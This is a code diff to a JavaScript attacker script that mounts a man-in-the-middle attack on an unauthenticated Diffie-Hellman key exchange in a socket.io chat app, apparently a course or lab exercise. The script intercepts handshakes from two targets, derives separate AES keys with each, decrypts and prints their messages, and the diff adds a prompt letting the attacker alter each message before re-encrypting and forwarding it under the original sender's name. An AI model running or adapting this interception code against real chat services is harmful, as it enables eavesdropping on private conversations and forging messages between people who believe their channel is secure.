@@ -3,7 +3,13 @@ const { generateKeyToSend, computeSymmetricKey } = require('./diffieHellmanAtkr.
 
 const io = require('socket.io-client'); // Import the socket.io-client library
 const aes256 = require("aes256");
+var readline = require('readline');
 
+var rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+
+});
 
 const socket = io('https://chatappserver-ucb7.onrender.com'); // Replace with the actual server URL
 
@@ -19,6 +25,7 @@ let diffieHellmanPublicTargetB = BigInt(0)
 let aesKeyWithTargetA = BigInt(0)
 let aesKeyWithTargetB = BigInt(0)
 const ourMessages = []
+
 
 
 
@@ -44,7 +51,7 @@ socket.on('broadcastMessage', (message) => {
     
     computeSymmetricKey(diffieHellmanPrivateUs, diffieHellmanPublicTargetA).then((aesKey) => {
       aesKeyWithTargetA = aesKey
-      console.log('aesKeyWithTargetA', aesKeyWithTargetA)
+      console.log(aesKeyWithTargetA)
     })
 
     ourMessages.push(diffieHellmanPublicUs.toString())
@@ -64,7 +71,7 @@ socket.on('broadcastMessage', (message) => {
     
     computeSymmetricKey(diffieHellmanPrivateUs, diffieHellmanPublicTargetB).then((aesKey) => {
       aesKeyWithTargetB = aesKey
-      console.log('aesKeyWithTargetB', aesKeyWithTargetB)
+      console.log(aesKeyWithTargetB)
     })
 
     ourMessages.push(diffieHellmanPublicUs.toString())
@@ -80,9 +87,12 @@ socket.on('broadcastMessage', (message) => {
 
   else if (message.sender === targetA && message.receiver === targetB && interceptedTargetA && interceptedTargetB && !ourMessages.includes(message.message)) {
     const decryptedMessage = aes256.decrypt(aesKeyWithTargetA, message.message)
-    console.log(`***** ${targetA} -> ${targetB}: ${decryptedMessage.length < 100 ? decryptedMessage : 'A LOT OF JUNK'}`)
-
-    const encryptedMessage = aes256.encrypt(aesKeyWithTargetB, decryptedMessage)
+    console.log(`***** original message - ${targetA} -> ${targetB}: ${decryptedMessage.length < 100 ? decryptedMessage : 'A LOT OF JUNK'}`)
+    rl.question('Modified message (leave empty for no change): ', (modifiedMessage) => {
+      if (modifiedMessage.length === 0) {
+        modifiedMessage = decryptedMessage
+      }
+      const encryptedMessage = aes256.encrypt(aesKeyWithTargetB, modifiedMessage)
     ourMessages.push(encryptedMessage)
     setTimeout(() => {
       socket.emit('sendMessage', {
@@ -92,13 +102,19 @@ socket.on('broadcastMessage', (message) => {
         handshake: false,
       })
     }, 100);
+    })
+
   }
 
   else if (message.sender === targetB && message.receiver === targetA && interceptedTargetA && interceptedTargetB && !ourMessages.includes(message.message)) {
     let decryptedMessage = aes256.decrypt(aesKeyWithTargetB, message.message)
     console.log(`***** ${targetB} -> ${targetA}: ${decryptedMessage.length < 100 ? decryptedMessage : 'A LOT OF JUNK'}`)
 
-    const encryptedMessage = aes256.encrypt(aesKeyWithTargetA, decryptedMessage)
+    rl.question('Modified message (leave empty for no change): ', (modifiedMessage) => {
+      if (modifiedMessage.length === 0) {
+        modifiedMessage = decryptedMessage
+      }
+      const encryptedMessage = aes256.encrypt(aesKeyWithTargetA, modifiedMessage)
     ourMessages.push(encryptedMessage)
     setTimeout(() => {
       socket.emit('sendMessage', {
@@ -108,6 +124,19 @@ socket.on('broadcastMessage', (message) => {
         handshake: false,
       })
     }, 100);
+    })
+
+
+  //   const encryptedMessage = aes256.encrypt(aesKeyWithTargetA, decryptedMessage)
+  //   ourMessages.push(encryptedMessage)
+  //   setTimeout(() => {
+  //     socket.emit('sendMessage', {
+  //       sender: targetB,
+  //       receiver: targetA,
+  //       message: encryptedMessage,
+  //       handshake: false,
+  //     })
+  //   }, 100);
   }
 });
 
